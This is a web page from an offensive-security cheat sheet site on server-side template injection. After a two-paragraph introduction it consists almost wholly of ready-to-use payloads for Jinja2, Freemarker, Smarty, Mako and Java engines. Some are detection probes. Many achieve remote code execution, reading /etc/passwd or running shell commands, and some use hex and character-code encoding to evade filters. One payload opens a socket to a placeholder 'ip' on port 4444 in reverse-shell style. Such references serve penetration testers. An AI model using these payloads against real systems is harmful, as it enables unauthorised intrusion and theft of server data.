<!DOCTYPE html>
<html>
  <head>
    <title>Exploit-me.com - CheatSheet</title>
    
      <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="revised" content="2022-04-18T19:45:41 CEST">
<title>Server-side Template Injection - Discovery and Exploitation :: Exploit-me.com - CheatSheet</title>
<link rel="shortcut icon" href="/cheatsheet/images/favicon.png" type="image/x-icon" />
<link href="/cheatsheet/css/nucleus.css" rel="stylesheet">
<link href="/cheatsheet/css/font-awesome.min.css" rel="stylesheet">
<link href="/cheatsheet/css/featherlight.min.css" rel="stylesheet">
<link href="/cheatsheet/css/auto-complete.css" rel="stylesheet">
<link href="/cheatsheet/theme-flex/style.css" rel="stylesheet">

<link rel="stylesheet" href="/cheatsheet/css/bootstrap.min.css">
<meta name="description" content="Discovery and Exploitation Server-side Template Injection.">



    
  </head>
  <body data-url="/cheatsheet/blog/ssti-discovery-and-exploitation/">
    
      <header>
  <div class="logo">
    
	
  
    <a class="baselink" href="/cheatsheet/">Exploit-me.com - CheatSheet</a>
  


  </div>
  <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
    <nav class="shortcuts">
            <li class="" role="">
                <a href="https://exploit-me.com/"  rel="noopener">
                  <i class='fa fa-bookmark'></i> <label>Exploit-Me - Home</label>
                </a>
            </li>
    </nav>
</header>
<article>
  <aside>
    <ul class="menu">
    <li data-nav-id="/cheatsheet/blog/" class="dd-item haschildren
        ">
      <div>
      <a href="/cheatsheet/blog/">Blogs</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/cheatsheet/blog/ssti-discovery-and-exploitation/" class="dd-item">
        <div>
          <a href="/cheatsheet/blog/ssti-discovery-and-exploitation/">
            Server-side Template Injection - Discovery and Exploitation
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/cheatsheet/blog/attacking-active-directory-for-pentesters/" class="dd-item">
        <div>
          <a href="/cheatsheet/blog/attacking-active-directory-for-pentesters/">
            Attacking Active Directory for Pentesters
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/cheatsheet/blog/osep-cheat-sheet/" class="dd-item">
        <div>
          <a href="/cheatsheet/blog/osep-cheat-sheet/">
            OSEP Windows &amp; Active Directory Exploitation Cheat Sheet and Command Reference.
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/cheatsheet/blog/online-offensive-security-tools/" class="dd-item">
        <div>
          <a href="/cheatsheet/blog/online-offensive-security-tools/">
            Online Offensive Security Tools
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/cheatsheet/blog/resource-based-deligation-via-impacket/" class="dd-item">
        <div>
          <a href="/cheatsheet/blog/resource-based-deligation-via-impacket/">
            Resource Based Deligation via Impacket
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/cheatsheet/blog/active-directory-exploitation/" class="dd-item">
        <div>
          <a href="/cheatsheet/blog/active-directory-exploitation/">
            Active Directory Exploitation Cheat Sheet
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/cheatsheet/blog/executing-linux-binaries-without-touching-disk/" class="dd-item">
        <div>
          <a href="/cheatsheet/blog/executing-linux-binaries-without-touching-disk/">
            Executing Linux Binaries Without Touching Disk
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/cheatsheet/blog/crackmapexec/" class="dd-item">
        <div>
          <a href="/cheatsheet/blog/crackmapexec/">
            CrackMapExec (a.k.a CME) 
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/cheatsheet/blog/windows-privilege-escalation/" class="dd-item">
        <div>
          <a href="/cheatsheet/blog/windows-privilege-escalation/">
            Windows Privilege Escalation.
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/cheatsheet/blog/linux-privilege-escalation/" class="dd-item">
        <div>
          <a href="/cheatsheet/blog/linux-privilege-escalation/">
            Linux Privilege Escalation
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
    <li data-nav-id="/cheatsheet/about/" class="dd-item haschildren
        ">
      <div>
      <a href="/cheatsheet/about/">Abouts</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/cheatsheet/about/naveed-ahmed-khan/" class="dd-item">
        <div>
          <a href="/cheatsheet/about/naveed-ahmed-khan/">
            Naveed Ahmed Khan
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/cheatsheet/about/asif/" class="dd-item">
        <div>
          <a href="/cheatsheet/about/asif/">
            Asif Durani
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>




    </ul>
    <section>
    </section>
  </aside>
  <section class="page">
    
    <div class="nav-select">
      <center>Navigation : 
        <select onchange="javascript:location.href = this.value;">
          
    <option value="/cheatsheet/blog/" >
   Blogs</option> 
      <option value="/cheatsheet/blog/ssti-discovery-and-exploitation/"  selected>- Server-side Template Injection - Discovery and Exploitation</option>
      <option value="/cheatsheet/blog/attacking-active-directory-for-pentesters/" >- Attacking Active Directory for Pentesters</option>
      <option value="/cheatsheet/blog/osep-cheat-sheet/" >- OSEP Windows &amp; Active Directory Exploitation Cheat Sheet and Command Reference.</option>
      <option value="/cheatsheet/blog/online-offensive-security-tools/" >- Online Offensive Security Tools</option>
      <option value="/cheatsheet/blog/resource-based-deligation-via-impacket/" >- Resource Based Deligation via Impacket</option>
      <option value="/cheatsheet/blog/active-directory-exploitation/" >- Active Directory Exploitation Cheat Sheet</option>
      <option value="/cheatsheet/blog/executing-linux-binaries-without-touching-disk/" >- Executing Linux Binaries Without Touching Disk</option>
      <option value="/cheatsheet/blog/crackmapexec/" >- CrackMapExec (a.k.a CME) </option>
      <option value="/cheatsheet/blog/windows-privilege-escalation/" >- Windows Privilege Escalation.</option>
      <option value="/cheatsheet/blog/linux-privilege-escalation/" >- Linux Privilege Escalation</option>
  
    <option value="/cheatsheet/about/" >
   Abouts</option>



        </select>
      </center>
    </div>
      <div>
        <div class="searchbox">
          <input data-search-input id="search-by" type="text" placeholder="Search...">
        </div>
      </div>
    

    <h1>Server-side Template Injection - Discovery and Exploitation</h1>
    
    
    
    <h2 id="server-side-template-injection">Server-side Template Injection</h2>
<p>Server-side Template Injection (SSTI) is becoming a more common vulnerability in web applications as more developers move to use templating engines. when developers misuse a templating engine, they can introduce vulnerabilities that range from XSS to remote code execution.</p>
<h2 id="discovery">Discovery</h2>
<p>Our first step is to determine which templating engine the target is using.</p>
<p>We can use following payload to test for SSTI manualy.</p>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">{{</span>7*7<span style="color:#f92672">}}</span>
<span style="color:#d88200">${</span><span style="color:#111">7</span><span style="color:#111">*7</span><span style="color:#d88200">}</span>
&lt;%<span style="color:#f92672">=</span> 7*7 %&gt;
<span style="color:#d88200">${</span><span style="color:#111">{7*7</span><span style="color:#d88200">}</span><span style="color:#f92672">}</span>
<span style="color:#75715e">#{7*7}</span>
@<span style="color:#f92672">(</span>1+2<span style="color:#f92672">)</span>
<span style="color:#d88200">${</span><span style="color:#111">7</span><span style="color:#111">*</span><span style="color:#d88200">&#39;7&#39;</span><span style="color:#d88200">}</span>
<span style="color:#f92672">{{</span> this <span style="color:#f92672">}}</span> 
</code></pre></div><p>Payload to test for SSTI using burp intruder.</p>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">{{</span>4*4<span style="color:#f92672">}}[[</span>5*5<span style="color:#f92672">]]</span>
<span style="color:#f92672">{{</span>7*7<span style="color:#f92672">}}</span>
<span style="color:#f92672">{{</span>7*<span style="color:#d88200">&#39;7&#39;</span><span style="color:#f92672">}}</span>
&lt;%<span style="color:#f92672">=</span> <span style="color:#ae81ff">7</span> * <span style="color:#ae81ff">7</span> %&gt;
<span style="color:#d88200">${</span><span style="color:#111">3</span><span style="color:#111">*3</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">{7*7</span><span style="color:#d88200">}</span><span style="color:#f92672">}</span>
@<span style="color:#f92672">(</span>1+2<span style="color:#f92672">)</span>
<span style="color:#75715e">#{3*3}</span>
<span style="color:#75715e">#{ 7 * 7 }</span>
<span style="color:#f92672">{{</span>dump<span style="color:#f92672">(</span>app<span style="color:#f92672">)}}</span>
<span style="color:#f92672">{{</span>app.request.server.all<span style="color:#111">|</span>join<span style="color:#f92672">(</span><span style="color:#d88200">&#39;,&#39;</span><span style="color:#f92672">)}}</span>
<span style="color:#f92672">{{</span>config.items<span style="color:#f92672">()}}</span>
<span style="color:#f92672">{{</span> <span style="color:#f92672">[]</span>.class.base.subclasses<span style="color:#f92672">()</span> <span style="color:#f92672">}}</span>
<span style="color:#f92672">{{</span><span style="color:#d88200">&#39;&#39;</span>.class.mro<span style="color:#f92672">()[</span>1<span style="color:#f92672">]</span>.subclasses<span style="color:#f92672">()}}</span>
<span style="color:#f92672">{{</span> <span style="color:#d88200">&#39;&#39;</span>.__class__.__mro__<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span>.__subclasses__<span style="color:#f92672">()</span> <span style="color:#f92672">}}</span>
<span style="color:#f92672">{</span>% <span style="color:#00a8c8">for</span> key, value in config.iteritems<span style="color:#f92672">()</span> %<span style="color:#f92672">}</span>&lt;dt&gt;<span style="color:#f92672">{{</span> key<span style="color:#111">|</span>e <span style="color:#f92672">}}</span>&lt;/dt&gt;&lt;dd&gt;<span style="color:#f92672">{{</span> value<span style="color:#111">|</span>e <span style="color:#f92672">}}</span>&lt;/dd&gt;<span style="color:#f92672">{</span>% endfor %<span style="color:#f92672">}</span>
<span style="color:#f92672">{{</span><span style="color:#d88200">&#39;a&#39;</span>.toUpperCase<span style="color:#f92672">()}}</span> 
<span style="color:#f92672">{{</span> request <span style="color:#f92672">}}</span>
<span style="color:#f92672">{{</span>self<span style="color:#f92672">}}</span>
&lt;%<span style="color:#f92672">=</span> File.open<span style="color:#f92672">(</span><span style="color:#d88200">&#39;/etc/passwd&#39;</span><span style="color:#f92672">)</span>.read %&gt;
&lt;<span style="color:#75715e">#assign ex = &#34;freemarker.template.utility.Execute&#34;?new()&gt;${ ex(&#34;id&#34;)}</span>
<span style="color:#f92672">[</span><span style="color:#75715e">#assign ex = &#39;freemarker.template.utility.Execute&#39;?new()]${ ex(&#39;id&#39;)}</span>
<span style="color:#d88200">${</span><span style="color:#d88200">&#34;freemarker.template.utility.Execute&#34;</span><span style="color:#111">?new()(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#f92672">{{</span>app.request.query.filter<span style="color:#f92672">(</span>0,0,1024,<span style="color:#f92672">{</span><span style="color:#d88200">&#39;options&#39;</span>:<span style="color:#d88200">&#39;system&#39;</span><span style="color:#f92672">})}}</span>
<span style="color:#f92672">{{</span> <span style="color:#d88200">&#39;&#39;</span>.__class__.__mro__<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span>.__subclasses__<span style="color:#f92672">()[</span>40<span style="color:#f92672">](</span><span style="color:#d88200">&#39;/etc/passwd&#39;</span><span style="color:#f92672">)</span>.read<span style="color:#f92672">()</span> <span style="color:#f92672">}}</span>
<span style="color:#f92672">{{</span> config.items<span style="color:#f92672">()[</span>4<span style="color:#f92672">][</span>1<span style="color:#f92672">]</span>.__class__.__mro__<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span>.__subclasses__<span style="color:#f92672">()[</span>40<span style="color:#f92672">](</span><span style="color:#d88200">&#34;/etc/passwd&#34;</span><span style="color:#f92672">)</span>.read<span style="color:#f92672">()</span> <span style="color:#f92672">}}</span>
<span style="color:#f92672">{{</span><span style="color:#d88200">&#39;&#39;</span>.__class__.mro<span style="color:#f92672">()[</span>1<span style="color:#f92672">]</span>.__subclasses__<span style="color:#f92672">()[</span>396<span style="color:#f92672">](</span><span style="color:#d88200">&#39;cat flag.txt&#39;</span>,shell<span style="color:#f92672">=</span>True,stdout<span style="color:#f92672">=</span>-1<span style="color:#f92672">)</span>.communicate<span style="color:#f92672">()[</span>0<span style="color:#f92672">]</span>.strip<span style="color:#f92672">()}}</span>
<span style="color:#f92672">{{</span>config.__class__.__init__.__globals__<span style="color:#f92672">[</span><span style="color:#d88200">&#39;os&#39;</span><span style="color:#f92672">]</span>.popen<span style="color:#f92672">(</span><span style="color:#d88200">&#39;ls&#39;</span><span style="color:#f92672">)</span>.read<span style="color:#f92672">()}}</span>
<span style="color:#f92672">{</span>% <span style="color:#00a8c8">for</span> x in <span style="color:#f92672">()</span>.__class__.__base__.__subclasses__<span style="color:#f92672">()</span> %<span style="color:#f92672">}{</span>% <span style="color:#00a8c8">if</span> <span style="color:#d88200">&#34;warning&#34;</span> in x.__name__ %<span style="color:#f92672">}{{</span>x<span style="color:#f92672">()</span>._module.__builtins__<span style="color:#f92672">[</span><span style="color:#d88200">&#39;__import__&#39;</span><span style="color:#f92672">](</span><span style="color:#d88200">&#39;os&#39;</span><span style="color:#f92672">)</span>.popen<span style="color:#f92672">(</span>request.args.input<span style="color:#f92672">)</span>.read<span style="color:#f92672">()}}{</span>%endif%<span style="color:#f92672">}{</span>%endfor%<span style="color:#f92672">}</span>
<span style="color:#f92672">{</span><span style="color:#111">$smarty</span>.version<span style="color:#f92672">}</span>
<span style="color:#f92672">{</span>php<span style="color:#f92672">}</span><span style="color:#111">echo</span> <span style="color:#d88200">`</span>id<span style="color:#d88200">`</span><span style="color:#111">;</span><span style="color:#f92672">{</span>/php<span style="color:#f92672">}</span>
<span style="color:#f92672">{{[</span><span style="color:#d88200">&#39;id&#39;</span><span style="color:#f92672">]</span><span style="color:#111">|</span>filter<span style="color:#f92672">(</span><span style="color:#d88200">&#39;system&#39;</span><span style="color:#f92672">)}}</span>
<span style="color:#f92672">{{[</span><span style="color:#d88200">&#39;cat\x20/etc/passwd&#39;</span><span style="color:#f92672">]</span><span style="color:#111">|</span>filter<span style="color:#f92672">(</span><span style="color:#d88200">&#39;system&#39;</span><span style="color:#f92672">)}}</span>
<span style="color:#f92672">{{[</span><span style="color:#d88200">&#39;cat$IFS/etc/passwd&#39;</span><span style="color:#f92672">]</span><span style="color:#111">|</span>filter<span style="color:#f92672">(</span><span style="color:#d88200">&#39;system&#39;</span><span style="color:#f92672">)}}</span>
<span style="color:#f92672">{{</span>request<span style="color:#111">|</span>attr<span style="color:#f92672">([</span>request.args.usc*2,request.args.class,request.args.usc*2<span style="color:#f92672">]</span><span style="color:#111">|</span>join<span style="color:#f92672">)}}</span>
<span style="color:#f92672">{{</span>request<span style="color:#111">|</span>attr<span style="color:#f92672">([</span><span style="color:#d88200">&#34;_&#34;</span>*2,<span style="color:#d88200">&#34;class&#34;</span>,<span style="color:#d88200">&#34;_&#34;</span>*2<span style="color:#f92672">]</span><span style="color:#111">|</span>join<span style="color:#f92672">)}}</span>
<span style="color:#f92672">{{</span>request<span style="color:#111">|</span>attr<span style="color:#f92672">([</span><span style="color:#d88200">&#34;__&#34;</span>,<span style="color:#d88200">&#34;class&#34;</span>,<span style="color:#d88200">&#34;__&#34;</span><span style="color:#f92672">]</span><span style="color:#111">|</span>join<span style="color:#f92672">)}}</span>
<span style="color:#f92672">{{</span>request<span style="color:#111">|</span>attr<span style="color:#f92672">(</span><span style="color:#d88200">&#34;__class__&#34;</span><span style="color:#f92672">)}}</span>
<span style="color:#f92672">{{</span>request.__class__<span style="color:#f92672">}}</span>
<span style="color:#f92672">{{</span>request<span style="color:#111">|</span>attr<span style="color:#f92672">(</span><span style="color:#d88200">&#39;application&#39;</span><span style="color:#f92672">)</span><span style="color:#111">|</span>attr<span style="color:#f92672">(</span><span style="color:#d88200">&#39;\x5f\x5fglobals\x5f\x5f&#39;</span><span style="color:#f92672">)</span><span style="color:#111">|</span>attr<span style="color:#f92672">(</span><span style="color:#d88200">&#39;\x5f\x5fgetitem\x5f\x5f&#39;</span><span style="color:#f92672">)(</span><span style="color:#d88200">&#39;\x5f\x5fbuiltins\x5f\x5f&#39;</span><span style="color:#f92672">)</span><span style="color:#111">|</span>attr<span style="color:#f92672">(</span><span style="color:#d88200">&#39;\x5f\x5fgetitem\x5f\x5f&#39;</span><span style="color:#f92672">)(</span><span style="color:#d88200">&#39;\x5f\x5fimport\x5f\x5f&#39;</span><span style="color:#f92672">)(</span><span style="color:#d88200">&#39;os&#39;</span><span style="color:#f92672">)</span><span style="color:#111">|</span>attr<span style="color:#f92672">(</span><span style="color:#d88200">&#39;popen&#39;</span><span style="color:#f92672">)(</span><span style="color:#d88200">&#39;id&#39;</span><span style="color:#f92672">)</span><span style="color:#111">|</span>attr<span style="color:#f92672">(</span><span style="color:#d88200">&#39;read&#39;</span><span style="color:#f92672">)()}}</span>
<span style="color:#f92672">{{</span><span style="color:#d88200">&#39;a&#39;</span>.getClass<span style="color:#f92672">()</span>.forName<span style="color:#f92672">(</span><span style="color:#d88200">&#39;javax.script.ScriptEngineManager&#39;</span><span style="color:#f92672">)</span>.newInstance<span style="color:#f92672">()</span>.getEngineByName<span style="color:#f92672">(</span><span style="color:#d88200">&#39;JavaScript&#39;</span><span style="color:#f92672">)</span>.eval<span style="color:#f92672">(</span><span style="color:#8045ff">\&#34;</span>new java.lang.String<span style="color:#f92672">(</span><span style="color:#d88200">&#39;xxx&#39;</span><span style="color:#f92672">)</span><span style="color:#8045ff">\&#34;</span><span style="color:#f92672">)}}</span>
<span style="color:#f92672">{{</span><span style="color:#d88200">&#39;a&#39;</span>.getClass<span style="color:#f92672">()</span>.forName<span style="color:#f92672">(</span><span style="color:#d88200">&#39;javax.script.ScriptEngineManager&#39;</span><span style="color:#f92672">)</span>.newInstance<span style="color:#f92672">()</span>.getEngineByName<span style="color:#f92672">(</span><span style="color:#d88200">&#39;JavaScript&#39;</span><span style="color:#f92672">)</span>.eval<span style="color:#f92672">(</span><span style="color:#8045ff">\&#34;</span>var <span style="color:#111">x</span><span style="color:#f92672">=</span>new java.lang.ProcessBuilder<span style="color:#111">;</span> x.command<span style="color:#f92672">(</span><span style="color:#8045ff">\\\&#34;</span>whoami<span style="color:#8045ff">\\\&#34;</span><span style="color:#f92672">)</span><span style="color:#111">;</span> x.start<span style="color:#f92672">()</span><span style="color:#8045ff">\&#34;</span><span style="color:#f92672">)}}</span>
<span style="color:#f92672">{{</span><span style="color:#d88200">&#39;a&#39;</span>.getClass<span style="color:#f92672">()</span>.forName<span style="color:#f92672">(</span><span style="color:#d88200">&#39;javax.script.ScriptEngineManager&#39;</span><span style="color:#f92672">)</span>.newInstance<span style="color:#f92672">()</span>.getEngineByName<span style="color:#f92672">(</span><span style="color:#d88200">&#39;JavaScript&#39;</span><span style="color:#f92672">)</span>.eval<span style="color:#f92672">(</span><span style="color:#8045ff">\&#34;</span>var <span style="color:#111">x</span><span style="color:#f92672">=</span>new java.lang.ProcessBuilder<span style="color:#111">;</span> x.command<span style="color:#f92672">(</span><span style="color:#8045ff">\\\&#34;</span>netstat<span style="color:#8045ff">\\\&#34;</span><span style="color:#f92672">)</span><span style="color:#111">;</span> org.apache.commons.io.IOUtils.toString<span style="color:#f92672">(</span>x.start<span style="color:#f92672">()</span>.getInputStream<span style="color:#f92672">())</span><span style="color:#8045ff">\&#34;</span><span style="color:#f92672">)}}</span>
<span style="color:#f92672">{{</span><span style="color:#d88200">&#39;a&#39;</span>.getClass<span style="color:#f92672">()</span>.forName<span style="color:#f92672">(</span><span style="color:#d88200">&#39;javax.script.ScriptEngineManager&#39;</span><span style="color:#f92672">)</span>.newInstance<span style="color:#f92672">()</span>.getEngineByName<span style="color:#f92672">(</span><span style="color:#d88200">&#39;JavaScript&#39;</span><span style="color:#f92672">)</span>.eval<span style="color:#f92672">(</span><span style="color:#8045ff">\&#34;</span>var <span style="color:#111">x</span><span style="color:#f92672">=</span>new java.lang.ProcessBuilder<span style="color:#111">;</span> x.command<span style="color:#f92672">(</span><span style="color:#8045ff">\\\&#34;</span>uname<span style="color:#8045ff">\\\&#34;</span>,<span style="color:#8045ff">\\\&#34;</span>-a<span style="color:#8045ff">\\\&#34;</span><span style="color:#f92672">)</span><span style="color:#111">;</span> org.apache.commons.io.IOUtils.toString<span style="color:#f92672">(</span>x.start<span style="color:#f92672">()</span>.getInputStream<span style="color:#f92672">())</span><span style="color:#8045ff">\&#34;</span><span style="color:#f92672">)}}</span>
<span style="color:#f92672">{</span>% <span style="color:#00a8c8">for</span> x in <span style="color:#f92672">()</span>.__class__.__base__.__subclasses__<span style="color:#f92672">()</span> %<span style="color:#f92672">}{</span>% <span style="color:#00a8c8">if</span> <span style="color:#d88200">&#34;warning&#34;</span> in x.__name__ %<span style="color:#f92672">}{{</span>x<span style="color:#f92672">()</span>._module.__builtins__<span style="color:#f92672">[</span><span style="color:#d88200">&#39;__import__&#39;</span><span style="color:#f92672">](</span><span style="color:#d88200">&#39;os&#39;</span><span style="color:#f92672">)</span>.popen<span style="color:#f92672">(</span><span style="color:#d88200">&#34;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&#34;ip\&#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&#34;/bin/cat\&#34;, \&#34;flag.txt\&#34;]);&#39;&#34;</span><span style="color:#f92672">)</span>.read<span style="color:#f92672">()</span>.zfill<span style="color:#f92672">(</span>417<span style="color:#f92672">)}}{</span>%endif%<span style="color:#f92672">}{</span>% endfor %<span style="color:#f92672">}</span>
<span style="color:#d88200">${</span><span style="color:#111">T</span><span style="color:#111">(java.lang.System).getenv()</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">T</span><span style="color:#111">(java.lang.Runtime).getRuntime().exec(</span><span style="color:#d88200">&#39;cat etc/passwd&#39;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">T</span><span style="color:#111">(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())</span><span style="color:#d88200">}${</span><span style="color:#111">self</span><span style="color:#111">.module.cache.util.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.module.runtime.util.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.template.module.cache.util.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.module.cache.compat.inspect.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.__init__.__globals__[</span><span style="color:#d88200">&#39;util&#39;</span><span style="color:#111">].os.system(</span><span style="color:#d88200">&#39;id&#39;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.template.module.runtime.util.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.module.filters.compat.inspect.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.module.runtime.compat.inspect.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.module.runtime.exceptions.util.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.template.__init__.__globals__[</span><span style="color:#d88200">&#39;os&#39;</span><span style="color:#111">].system(</span><span style="color:#d88200">&#39;id&#39;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.module.cache.util.compat.inspect.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.module.runtime.util.compat.inspect.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.template._mmarker.module.cache.util.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.template.module.cache.compat.inspect.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.module.cache.compat.inspect.linecache.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.template._mmarker.module.runtime.util.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.attr._NSAttr__parent.module.cache.util.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.template.module.filters.compat.inspect.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.template.module.runtime.compat.inspect.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.module.filters.compat.inspect.linecache.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.module.runtime.compat.inspect.linecache.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.template.module.runtime.exceptions.util.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.attr._NSAttr__parent.module.runtime.util.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.context._with_template.module.cache.util.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.module.runtime.exceptions.compat.inspect.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.template.module.cache.util.compat.inspect.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.context._with_template.module.runtime.util.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.module.cache.util.compat.inspect.linecache.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.template.module.runtime.util.compat.inspect.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.module.runtime.util.compat.inspect.linecache.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
